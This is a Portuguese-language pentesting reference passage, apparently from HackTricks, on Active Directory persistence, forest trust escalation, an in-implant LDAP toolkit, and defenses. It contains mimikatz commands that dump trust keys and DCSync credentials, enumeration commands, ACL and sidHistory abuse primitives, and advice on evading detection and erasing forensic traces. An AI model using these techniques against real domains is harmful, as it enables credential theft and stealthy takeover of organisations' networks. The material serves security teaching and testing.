### **Certificates Domain Persistence**

**Usar certificados também permite persistir com privilégios elevados dentro do domínio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

O objeto **AdminSDHolder** no Active Directory assegura a segurança de **grupos privilegiados** (como Domain Admins e Enterprise Admins) aplicando uma **ACL** padrão nesses grupos para evitar alterações não autorizadas. Contudo, essa funcionalidade pode ser explorada; se um atacante modificar a ACL do AdminSDHolder para dar acesso total a um usuário comum, esse usuário ganha amplo controle sobre todos os grupos privilegiados. Essa medida de segurança, projetada para proteger, pode voltar‑se contra o ambiente, permitindo acesso indevido a menos que seja monitorada de perto.

[**Mais informação sobre AdminDSHolder Group aqui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dentro de cada **Domain Controller (DC)** existe uma conta de **administrador local**. Ao obter direitos de admin numa dessas máquinas, o hash do Administrator local pode ser extraído usando **mimikatz**. Em seguida é necessária uma modificação no registry para **habilitar o uso dessa senha**, permitindo acesso remoto à conta Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Você poderia **dar** algumas **permissões especiais** a um **usuário** sobre certos objetos do domínio que permitirão ao usuário **escalar privilégios no futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Os **security descriptors** são usados para **armazenar** as **permissões** que um **objeto** tem **sobre** outro **objeto**. Se você apenas **fizer** uma **pequena alteração** no **security descriptor** de um objeto, pode obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse a auxiliary class `dynamicObject` para criar principals/GPOs/DNS records de curta duração com `entryTTL`/`msDS-Entry-Time-To-Die`; eles se auto‑deletam sem tombstones, apagando evidências LDAP enquanto deixam SIDs órfãos, referências `gPLink` quebradas ou respostas DNS em cache (por exemplo, poluição de ACE do AdminSDHolder ou `gPCFileSysPath` malicioso/redirects AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Altere o **LSASS** na memória para estabelecer uma **senha universal**, concedendo acesso a todas as contas do domínio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Você pode criar o seu **próprio SSP** para **capturar** em **clear text** as **credenciais** usadas para acessar a máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Regista um **novo Domain Controller** no AD e usa‑o para **push de atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar quaisquer **logs** relativos às **modificações**. Você **precisa de DA** privileges e estar dentro do **root domain**.\
Note que se usar dados incorretos, logs bastante feios irão aparecer.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Anteriormente discutimos como escalar privilégios se você tem **permissão suficiente para ler senhas LAPS**. Contudo, essas senhas também podem ser usadas para **manter persistência**.\
Veja:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

A Microsoft vê a **Forest** como a fronteira de segurança. Isso implica que **comprometer um único domínio pode potencialmente levar ao comprometimento de toda a Forest**.

### Basic Information

Uma [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) é um mecanismo de segurança que permite a um usuário de um **domínio** acessar recursos em outro **domínio**. Essencialmente cria uma ligação entre os sistemas de autenticação dos dois domínios, permitindo que verificações de autenticação fluam de forma transparente. Quando domínios configuram uma trust, eles trocam e retêm chaves específicas dentro de seus **Domain Controllers (DCs)**, que são cruciais para a integridade da trust.

Num cenário típico, se um usuário pretende acessar um serviço em um **domínio confiável**, ele deve primeiro solicitar um ticket especial conhecido como **inter-realm TGT** do DC do seu próprio domínio. Esse TGT é encriptado com uma **chave** compartilhada que ambos os domínios acordaram. O usuário então apresenta esse TGT ao **DC do domínio confiável** para obter um service ticket (**TGS**). Após validação bem‑sucedida do inter-realm TGT pelo DC do domínio confiável, ele emite um TGS, concedendo acesso ao serviço.

**Passos**:

1. Um **computer cliente** em **Domain 1** inicia o processo usando seu **NTLM hash** para solicitar um **Ticket Granting Ticket (TGT)** ao seu **Domain Controller (DC1)**.
2. DC1 emite um novo TGT se o cliente for autenticado com sucesso.
3. O cliente então solicita um **inter-realm TGT** ao DC1, que é necessário para acessar recursos em **Domain 2**.
4. O inter-realm TGT é encriptado com uma **trust key** compartilhada entre DC1 e DC2 como parte da trust bidirecional entre domínios.
5. O cliente leva o inter-realm TGT ao **Domain Controller (DC2)** de **Domain 2**.
6. DC2 verifica o inter-realm TGT usando sua trust key compartilhada e, se válido, emite um **Ticket Granting Service (TGS)** para o servidor em Domain 2 que o cliente deseja acessar.
7. Finalmente, o cliente apresenta esse TGS ao servidor, que está encriptado com o hash da conta do servidor, para obter acesso ao serviço em Domain 2.

### Different trusts

É importante notar que **uma trust pode ser 1 way ou 2 ways**. Na opção 2 ways, ambos os domínios confiarão um no outro, mas na relação de trust **1 way** um dos domínios será o **trusted** e o outro o **trusting**. No último caso, **você só conseguirá acessar recursos dentro do trusting domain a partir do trusted**.

Se Domain A trusts Domain B, A é o trusting domain e B é o trusted. Além disso, em **Domain A**, isto seria uma **Outbound trust**; e em **Domain B**, isto seria uma **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: É uma configuração comum dentro da mesma forest, onde um child domain automaticamente tem uma two-way transitive trust com seu parent domain. Essencialmente, isso significa que pedidos de autenticação podem fluir sem problemas entre parent e child.
- **Cross-link Trusts**: Conhecidas como "shortcut trusts", são estabelecidas entre child domains para acelerar processos de referral. Em forests complexas, referrals de autenticação normalmente precisam subir até a raiz da forest e depois descer até o domínio alvo. Criando cross-links, a jornada é encurtada, o que é especialmente útil em ambientes geograficamente dispersos.
- **External Trusts**: São configuradas entre domínios diferentes e não relacionados e são non-transitive por natureza. Segundo a documentação da [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts são úteis para acessar recursos em um domínio fora da forest atual que não está conectado por uma forest trust. A segurança é reforçada através de SID filtering com external trusts.
- **Tree-root Trusts**: Essas trusts são automaticamente estabelecidas entre o forest root domain e um recém-adicionado tree root. Embora não sejam comuns, tree-root trusts são importantes para adicionar novas domain trees a uma forest, permitindo que mantenham um nome de domínio único e assegurando transitividade two-way. Mais informação pode ser encontrada na [guia da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Este tipo de trust é uma two-way transitive trust entre dois forest root domains, também aplicando SID filtering para reforçar medidas de segurança.
- **MIT Trusts**: Essas trusts são estabelecidas com domínios Kerberos não‑Windows, compatíveis com [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts são mais especializadas e atendem ambientes que requerem integração com sistemas Kerberos fora do ecossistema Windows.

#### Other differences in **trusting relationships**

- Uma relação de trust também pode ser **transitive** (A trusts B, B trusts C, então A trusts C) ou **non-transitive**.
- Uma relação de trust pode ser configurada como **bidirectional trust** (ambos confiam um no outro) ou como **one-way trust** (apenas um deles confia no outro).

### Attack Path

1. **Enumere** as relações de trusting
2. Verifique se algum **security principal** (user/group/computer) tem **acesso** a recursos do **outro domínio**, talvez por entradas ACE ou por fazer parte de grupos do outro domínio. Procure por **relações através de domínios** (a trust foi criada provavelmente para isso).
1. kerberoast neste caso pode ser outra opção.
3. **Comprometa** as **contas** que podem **pivotar** através dos domínios.

Atacantes podem acessar recursos em outro domínio através de três mecanismos primários:

- **Local Group Membership**: Principals podem ser adicionados a grupos locais em máquinas, como o grupo “Administrators” num servidor, concedendo controle significativo sobre essa máquina.
- **Foreign Domain Group Membership**: Principals também podem ser membros de grupos dentro do domínio estrangeiro. Contudo, a efetividade desse método depende da natureza da trust e do escopo do grupo.
- **Access Control Lists (ACLs)**: Principals podem ser especificados numa **ACL**, particularmente como entidades em **ACEs** dentro de uma **DACL**, fornecendo acesso a recursos específicos. Para quem deseja se aprofundar na mecânica de ACLs, DACLs e ACEs, o whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” é um recurso inestimável.

### Find external users/groups with permissions

Você pode checar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar foreign security principals no domínio. Estes serão usuários/grupos de **um domínio/forest externo**.

Você pode verificar isso no **Bloodhound** ou usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Outras formas de enumerar trusts de domínio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Existem **2 trusted keys**, uma para _Child --> Parent_ e outra para _Parent_ --> _Child_.\
> Você pode ver qual é usada pelo domínio atual com:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin to the child/parent domain abusing the trust with SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Compreender como o Configuration Naming Context (NC) pode ser explorado é crucial. O Configuration NC serve como um repositório central para dados de configuração em toda uma forest em ambientes Active Directory (AD). Esses dados são replicados para cada Domain Controller (DC) dentro da forest, com writable DCs mantendo uma cópia gravável do Configuration NC. Para explorar isso, é necessário ter **SYSTEM privileges on a DC**, preferencialmente um child DC.

**Link GPO to root DC site**

O container Sites do Configuration NC inclui informações sobre os sites de todos os computadores ingressados ao domínio dentro da forest AD. Operando com SYSTEM privileges on any DC, um atacante pode vincular GPOs aos sites do root DC. Essa ação pode comprometer potencialmente o domínio root ao manipular as políticas aplicadas a esses sites.

Foram realizadas pesquisas detalhadas sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Um vetor de ataque envolve mirar em gMSAs privilegiadas dentro do domínio. A KDS Root key, essencial para calcular as passwords das gMSAs, está armazenada dentro do Configuration NC. Com SYSTEM privileges on any DC, é possível acessar a KDS Root key e calcular as passwords de qualquer gMSA em toda a forest.

Análises detalhadas e orientações passo a passo podem ser encontradas em:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementar a MSA delegada (BadSuccessor – abusando atributos de migração):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Pesquisa externa adicional: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Esse método requer paciência, aguardando a criação de novos objetos AD privilegiados. Com SYSTEM privileges, um atacante pode modificar o AD Schema para conceder a qualquer usuário controle total sobre todas as classes. Isso pode resultar em acesso e controle não autorizados sobre objetos AD recém-criados.

Leitura adicional: [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

A vulnerabilidade ADCS ESC5 mira o controle sobre objetos de Public Key Infrastructure (PKI) para criar um template de certificado que permite autenticar-se como qualquer usuário dentro da forest. Como os objetos PKI residem no Configuration NC, comprometer um child DC gravável permite a execução de ataques ESC5.

Mais detalhes podem ser lidos em [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Em cenários sem ADCS, o atacante tem a capacidade de configurar os componentes necessários, como discutido em [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Neste cenário **seu domain é confiado** por um externo, concedendo-lhe **permissões indeterminadas** sobre ele. Você precisará descobrir **quais principals do seu domain têm qual acesso sobre o domain externo** e então tentar explorá-lo:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domínio de Floresta Externa - Unidirecional (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Neste cenário **seu domínio** está **confiando** alguns **privilégios** a um principal de **domínios diferentes**.

No entanto, quando um **domínio é confiado** pelo domínio confiador, o domínio confiado **cria um usuário** com um **nome previsível** que usa como **password a senha confiada**. Isso significa que é possível **acessar um usuário do domínio confiador para entrar no domínio confiado** para enumerá-lo e tentar escalar mais privilégios:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Outra forma de comprometer o domínio confiado é encontrar um [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) criado na **direção oposta** da confiança de domínio (o que não é muito comum).

Outra forma de comprometer o domínio confiado é aguardar em uma máquina onde um **usuário do domínio confiado pode acessar** para fazer login via **RDP**. Em seguida, o atacante poderia injetar código no processo da sessão RDP e **acessar o domínio de origem da vítima** a partir daí.\ Além disso, se a **vítima montou seu disco rígido**, a partir do processo da **sessão RDP** o atacante poderia armazenar **backdoors** na **pasta de inicialização do disco rígido**. Essa técnica é chamada **RDPInception.**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigação do abuso de confiança de domínio

### **SID Filtering:**

- O risco de ataques que exploram o atributo SID history através de trusts entre florestas é mitigado pelo SID Filtering, que é ativado por padrão em todas as trusts entre florestas. Isso se baseia na suposição de que as trusts intra-floresta são seguras, considerando a floresta, e não o domínio, como a fronteira de segurança segundo a posição da Microsoft.
- No entanto, há um porém: o SID Filtering pode interromper aplicações e o acesso de usuários, levando à sua desativação ocasional.

### **Selective Authentication:**

- Para trusts entre florestas, empregar Selective Authentication garante que usuários das duas florestas não sejam autenticados automaticamente. Em vez disso, permissões explícitas são requeridas para que os usuários acessem domínios e servidores dentro do domínio ou floresta confiadora.
- É importante notar que essas medidas não protegem contra a exploração do Configuration Naming Context (NC) gravável nem contra ataques à conta de trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abuso de AD baseado em LDAP a partir de implantes no host

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operadores compilam o pacote com `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, carregam `ldap.axs`, e então chamam `ldap <subcommand>` do beacon. Todo o tráfego usa o contexto de segurança do logon atual sobre LDAP (389) com signing/sealing ou LDAPS (636) com confiança automática de certificados, então não são necessários socks proxies nem artefatos no disco.

### Enumeração LDAP do lado do implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolvem nomes curtos/caminhos de OU em DNs completos e listam os objetos correspondentes.
- `get-object`, `get-attribute`, and `get-domaininfo` obtêm atributos arbitrários (incluindo security descriptors) além dos metadados da floresta/domínio a partir de `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expõem candidatos a roasting, configurações de delegação e descritores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) diretamente do LDAP.
- `get-acl` and `get-writable --detailed` analisam o DACL para listar trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), e herança, fornecendo alvos imediatos para escalada de privilégios via ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitivas de escrita LDAP para escalada & persistência

- BOFs de criação de objetos (`add-user`, `add-computer`, `add-group`, `add-ou`) permitem que o operador prepare novos principals ou contas de máquina onde existirem direitos de OU. `add-groupmember`, `set-password`, `add-attribute`, and `set-attribute` sequestram diretamente os alvos assim que write-property rights forem encontrados.
- Comandos focados em ACL como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, e `add-dcsync` traduzem WriteDACL/WriteOwner em qualquer objeto AD para resets de senha, controle de membros de grupos, ou privilégios de replicação DCSync sem deixar artefatos PowerShell/ADSI. Contrapartes `remove-*` limpam ACEs injetadas.

### Delegação, roasting, e abuso de Kerberos

- `add-spn`/`set-spn` tornam instantaneamente um usuário comprometido Kerberoastable; `add-asreproastable` (toggle UAC) o marca para AS-REP roasting sem tocar a senha.
- Macros de delegação (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescrevem `msDS-AllowedToDelegateTo`, flags UAC, ou `msDS-AllowedToActOnBehalfOfOtherIdentity` a partir do beacon, habilitando caminhos de ataque constrained/unconstrained/RBCD e eliminando a necessidade de PowerShell remoto ou RSAT.

### Injeção de sidHistory, realocação de OU e modelagem da superfície de ataque

- `add-sidhistory` injeta SIDs privilegiados no sidHistory de um principal controlado (see [SID-History Injection](sid-history-injection.md)), fornecendo herança de acesso furtiva totalmente via LDAP/LDAPS.
- `move-object` altera o DN/OU de computadores ou usuários, permitindo que um atacante mova ativos para OUs onde já existem direitos delegados antes de abusar de `set-password`, `add-groupmember`, ou `add-spn`.
- Comandos de remoção de escopo restrito (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permitem reversão rápida depois que o operador colhe credenciais ou persistência, minimizando telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algumas Defesas Gerais

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para proteção de credenciais**

- **Domain Admins Restrictions**: Recomenda-se que Domain Admins só sejam autorizados a logar em Domain Controllers, evitando seu uso em outros hosts.
- **Service Account Privileges**: Serviços não devem ser executados com privilégios Domain Admin (DA) para manter a segurança.
- **Temporal Privilege Limitation**: Para tarefas que requerem privilégios DA, sua duração deve ser limitada. Isso pode ser alcançado por: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audite os Event IDs 2889/3074/3075 e então aplique LDAP signing além de LDAPS channel binding em DCs/clients para bloquear tentativas de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementando técnicas de Deception**

- Implementar deception envolve montar armadilhas, como usuários ou computadores isca, com características como senhas que não expiram ou marcados como Trusted for Delegation. Uma abordagem detalhada inclui criar usuários com direitos específicos ou adicioná-los a grupos de alto privilégio.
- Um exemplo prático envolve usar ferramentas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- More on deploying deception techniques can be found at [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificando Deception**

- **For User Objects**: Indicadores suspeitos incluem ObjectSID atípico, logons pouco frequentes, datas de criação e baixa contagem de bad password.
- **General Indicators**: Comparar atributos de objetos potenciais de isca com os de objetos genuínos pode revelar inconsistências. Ferramentas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) podem ajudar a identificar tais decepções.

### **Contornando sistemas de detecção**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitar enumeração de sessão em Domain Controllers para prevenir detecção pelo ATA.
- **Ticket Impersonation**: Utilizar chaves **aes** para criação de tickets ajuda a evadir detecção ao não rebaixar para NTLM.
- **DCSync Attacks**: Recomenda-se executar a partir de um host não-Domain Controller para evitar detecção pelo ATA, pois execução direta de um Domain Controller disparará alertas.

## Referências

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
